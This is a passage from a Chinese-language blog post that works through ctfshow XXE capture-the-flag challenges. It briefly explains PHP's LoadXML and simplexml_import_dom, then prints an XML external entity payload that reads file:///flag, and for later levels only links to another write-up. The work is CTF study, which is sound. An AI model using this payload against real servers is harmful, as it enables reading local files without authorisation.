class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>LoadXML是MS提供的XMLDom接口中的一个函数，用于将字符串载入一个XML document,该函数的使用存在很多注意事项<br>simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象</p>
</blockquote>
<p>paylaod</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;cyx&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/cyx&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web374-378"><a href="#web374-378" class="headerlink" title="web374~378"></a>web374~378</h2><p>由于这些题目需要服务器则看大佬wp<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/njh18790816639/article/details/117295145?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164180737616781685331283%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164180737616781685331283&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-117295145.pc_search_insert_es_download&utm_term=ctfshowXXE&spm=1018.2226.3001.4187">大佬wp</a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>